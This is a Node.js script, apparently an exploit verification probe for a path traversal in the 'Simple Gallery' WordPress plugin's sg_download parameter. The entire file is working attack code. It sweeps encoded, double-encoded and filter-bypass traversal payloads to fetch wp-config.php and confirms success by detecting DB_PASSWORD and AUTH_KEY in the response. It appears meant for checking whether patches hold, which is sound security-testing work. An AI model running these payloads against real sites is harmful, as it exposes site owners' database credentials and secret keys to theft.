#!/usr/bin/env node
/**
 * probe.mjs - Exploit verification probe for Simple Gallery <= 2.0.0
 * Unauthenticated Path Traversal via the `sg_download` parameter
 * (CVE-2026-90002).
 *
 * Usage: node probe.mjs <base-url>
 *
 * Exit code 0: target is exploitable (vulnerable)
 * Exit code 1: target is NOT exploitable (appears fixed / inconclusive)
 *
 * Only talks to the given base URL. Makes no filesystem writes.
 * Tries several realistic variants of the traversal payload (plain
 * "../" sequences at various depths, URL-encoded slashes, double
 * URL-encoded slashes, and a naive-filter-bypass pattern) so that a
 * patch which only blocks the single most obvious payload is still
 * correctly detected as vulnerable.
 */

const base = process.argv[2];
if (!base) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

let origin;
try {
  origin = new URL(base).origin;
} catch (e) {
  console.error('Invalid base URL:', base);
  process.exit(1);
}

// Markers that are present in essentially every real wp-config.php,
// regardless of the specific lab fixture's credentials/salts. Avoids
// overly "loud" keyword guesses that a naive filter might specifically
// target (e.g. the literal string "../"), while still being specific
// enough that a false positive (e.g. an error page) won't trigger it.
const CONFIG_MARKERS = [
  "define('DB_NAME'",
  'define("DB_NAME"',
  "DB_PASSWORD",
  "AUTH_KEY",
  "wp-settings.php",
];

function looksLikeWpConfig(text) {
  if (!text || text.length < 20) return false;
  // Must not look like the plugin's normal 404/empty response.
  let hits = 0;
  for (const m of CONFIG_MARKERS) {
    if (text.includes(m)) hits++;
  }
  return hits >= 2; // require at least 2 distinct markers to avoid flukes
}

// Candidate relative-path depths: the uploads/simple-gallery dir is
// typically 3 levels below the webroot (wp-content/uploads/simple-gallery),
// but different installs may vary, so we sweep a small range.
const DEPTHS = [1, 2, 3, 4, 5, 6, 7];

function buildPayloads() {
  const target = 'wp-config.php';
  const payloads = [];

  for (const n of DEPTHS) {
    const plain = '../'.repeat(n) + target;
    payloads.push(plain);

    // Single URL-encoded slashes (%2f)
    const encSlash = '..%2f'.repeat(n) + target;
    payloads.push(encSlash);

    // URL-encoded dots and slashes
    const encDotSlash = '%2e%2e%2f'.repeat(n) + target;
    payloads.push(encDotSlash);

    // Double URL-encoded slashes (%252f) - defeats a single decode pass
    const doubleEnc = '..%252f'.repeat(n) + target;
    payloads.push(doubleEnc);

    // Backslash variant (in case of naive forward-slash-only filtering,
    // or mixed path handling)
    const backslash = '..\\'.repeat(n) + target;
    payloads.push(backslash);

    // Naive str_replace('../','',...) bypass: "....//" collapses to
    // "../" after a single non-recursive removal pass.
    const naiveBypass = '....//'.repeat(n) + target;
    payloads.push(naiveBypass);

    // Mixed: one extra leading slash variants some filters miss
    const leadSlash = '/' + '../'.repeat(n) + target;
    payloads.push(leadSlash);
  }

  // Deduplicate
  return [...new Set(payloads)];
}

async function tryPayload(payload) {
  const url = `${origin}/?sg_download=${payload}`;
  try {
    const res = await fetch(url, { redirect: 'follow' });
    if (res.status !== 200) return false;
    const text = await res.text();
    return looksLikeWpConfig(text);
  } catch (e) {
    return false;
  }
}

async function main() {
  const payloads = buildPayloads();
  let vulnerable = false;
  let workingPayload = null;

  for (const p of payloads) {
    // eslint-disable-next-line no-await-in-loop
    const ok = await tryPayload(p);
    if (ok) {
      vulnerable = true;
      workingPayload = p;
      break;
    }
  }

  // Nothing to "undo": the probe only performs GET requests that read
  // files via the plugin's own readfile() call; it never writes any
  // state on the target, so there is nothing to restore.

  if (vulnerable) {
    console.log(
      `VULNERABLE: path traversal via sg_download confirmed using payload: ${workingPayload}`
    );
    process.exit(0);
  } else {
    console.log('NOT VULNERABLE: no path traversal variant succeeded.');
    process.exit(1);
  }
}

main();
